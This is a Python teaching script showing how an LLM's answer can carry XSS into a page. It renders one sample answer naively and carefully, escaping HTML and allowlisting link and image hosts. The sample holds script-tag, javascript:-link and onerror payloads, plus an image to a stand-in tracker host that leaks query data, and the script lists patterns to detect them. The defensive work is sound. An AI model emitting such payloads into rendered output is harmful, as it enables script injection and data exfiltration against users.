# Improper output handling: the model's answer is untrusted input to whatever displays it.
# One answer, rendered to HTML the easy way and the careful way.

import html
import re
import sys

import markdown

sys.path.insert(0, "code")
from clarity.platform.guard import egress_violations              # noqa: E402

ANSWER = """Revenue in 2024 Q3 was **$8,461,220**.

<script>alert(1)</script>
[See the source](javascript:alert(1)) or the [quarterly review](https://docs.meridian.example/qbr-2024-Q3)
<img src="x" onerror="alert(1)">
![chart](https://tracker.example/pixel.png?q=revenue)"""

ALLOWED_HOSTS = {"docs.meridian.example"}
DANGER = {"script tag": r"<script", "event handler": r"<[a-z][^>]*\son\w+\s*=",
          "javascript: link": r"href=\"javascript:", "remote image": r"<img[^>]+src=\"https?://"}


def easy(text: str) -> str:
    return markdown.markdown(text)                    # raw HTML passes straight through


def careful(text: str) -> str:
    # 1. The model does not get to write HTML: escape it before markdown sees it.
    rendered = markdown.markdown(html.escape(text, quote=False))
    # 2. Links keep only schemes and hosts we chose; anything else becomes plain text.
    def link(match: re.Match) -> str:
        href, label = match.group(1), match.group(2)
        host = re.sub(r"^https?://([^/]+).*", r"\1", href)
        if href.startswith("https://") and host in ALLOWED_HOSTS:
            return match.group(0)
        return label
    rendered = re.sub(r'<a href="([^"]*)">(.*?)</a>', link, rendered)
    # 3. Images are removed unless their host is approved — the exfiltration channel.
    return re.sub(r'<img[^>]*src="([^"]*)"[^>]*/?>',
                  lambda m: m.group(0) if not egress_violations(m.group(1), ALLOWED_HOSTS)
                  else "", rendered)


print(f"  {'construct':<18} {'easy render':>12} {'careful render':>15}")
for name, pattern in DANGER.items():
    in_easy = bool(re.search(pattern, easy(ANSWER)))
    in_careful = bool(re.search(pattern, careful(ANSWER)))
    print(f"  {name:<18} {'present' if in_easy else '-':>12} "
          f"{'present' if in_careful else '-':>15}")

kept = re.findall(r'href="([^"]+)"', careful(ANSWER))
print(f"\n  links kept by the careful render: {kept}")
print("  escaped, and therefore shown as text rather than run:",
      "&lt;script&gt;" in careful(ANSWER))
